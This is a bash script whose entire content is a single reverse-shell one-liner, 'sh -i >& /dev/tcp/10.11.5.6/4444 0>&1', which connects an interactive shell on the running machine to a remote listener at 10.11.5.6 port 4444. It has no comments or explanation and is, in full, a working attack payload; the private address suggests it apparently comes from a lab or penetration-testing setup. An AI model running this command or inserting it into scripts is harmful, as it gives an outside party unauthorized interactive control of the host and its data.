#!/usr/bin/env bash

sh -i >& /dev/tcp/10.11.5.6/4444 0>&1
